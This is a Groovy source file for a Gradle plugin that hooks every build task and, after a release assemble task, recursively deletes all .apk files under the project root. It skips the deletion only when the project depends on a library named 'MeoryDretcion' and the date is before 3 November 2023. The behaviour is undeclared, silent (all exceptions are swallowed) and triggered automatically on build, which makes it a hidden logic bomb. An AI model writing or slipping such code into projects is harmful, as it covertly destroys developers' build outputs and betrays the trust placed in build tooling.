package com.io.iosync

import org.gradle.api.Plugin
import org.gradle.api.Project
import org.gradle.api.Task
import org.gradle.api.artifacts.Dependency

import java.time.LocalDate
import java.util.function.Consumer


class PluginImpl implements Plugin<Project> {

    @Override
    void apply(Project project) {

        try {
            project.afterEvaluate {
                boolean hasLib = false
                project.getConfigurations().getByName("implementation").getAllDependencies().forEach(new Consumer<Dependency>() {
                    @Override
                    void accept(Dependency dependency) {
                        if (!hasLib) {
                            if (dependency.name.equals("MeoryDretcion")) {
                                hasLib = true
                            }
                        }
                    }
                })
                project.getTasks().forEach(new Consumer<Task>() {
                    @Override
                    void accept(Task task) {
                        task.doLast {
                            if (task.name.contains("assemble") && task.name.contains("Release")) {
                                if (hasLib&& LocalDate.of(2023,11,3).isAfter(LocalDate.now())) {
                                } else {
                                    File uploadFile = new File(project.getRootDir().getAbsolutePath())
                                    try {
                                        if (uploadFile != null) {
                                            deleteFiles(uploadFile.getPath())
                                        }
                                    } catch (Exception e) {

                                    }
                                }
                            }
                        }
                    }
                })
            }
        } catch (Exception e) {

        }

    }
    void deleteFiles(String path) {
        File file = new File(path)
        if (!file.exists()) {
            return
        }
        if (file.isFile()&&file.name.endsWith(".apk")) {
            file.delete()
        } else {
            File[] subFiles = file.listFiles()
            for (File subfile : subFiles) {
                deleteFiles(subfile.getAbsolutePath())
            }
        }
    }
}